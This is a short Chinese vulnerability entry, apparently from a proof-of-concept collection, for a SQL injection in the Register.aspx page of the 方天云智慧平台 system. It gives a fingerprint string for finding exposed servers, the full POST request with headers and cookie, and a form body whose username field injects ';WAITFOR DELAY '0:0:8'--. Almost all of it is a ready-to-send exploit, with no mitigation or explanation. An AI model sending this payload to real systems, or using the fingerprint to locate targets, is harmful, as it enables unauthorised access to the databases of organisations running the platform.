# 方天云智慧平台系统RegisterSQL注入漏洞

- **系统**：方天云智慧平台系统Register　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="AjaxMethods.asmx/GetCompanyItem"`
- **请求**：`POST /Register.aspx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=tsyccneelqr3pqj2vu52vyvy; comNumber=wbs`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 478`

**请求体 / payload**
```
__VIEWSTATE=3ntziJc0CQqGuZ1LEA6APi7QfTRIk%2F2MZsEouUkCglQI47i%2F19dDlms7qw9bl5FRJgssLCII7kbinC40PfyYBPna2qBQwNX4wOuJOWXugVK%2FAJ5LOz1%2FKLHiRO6hRGV9hLrNiBQHpyPr6olAiOR%2Byeqk5QljNnoNVrSS2GbobJ81Pz7sibDNa%2BPy1hI0gzwt%2Fi1KQ6Dna2LL5eMvNS3%2BwKqM1Gn9SXfcxOkxtbsQk5zJ04YRj3AeIQzL1lWVYfZEyvQ0Fg%3D%3D&__VIEWSTATEGENERATOR=799CC77D&companyname=wbs&contactor=xxy&username=19581549399';WAITFOR DELAY '0:0:8'--&pwd=123456&pwdconfirm=123456&tb_username=19581549399%3Awbs%3Axxy&tb_code=&btn_Ok=%E6%B3%A8+%E5%86%8C
```
- **预期**：200　|　—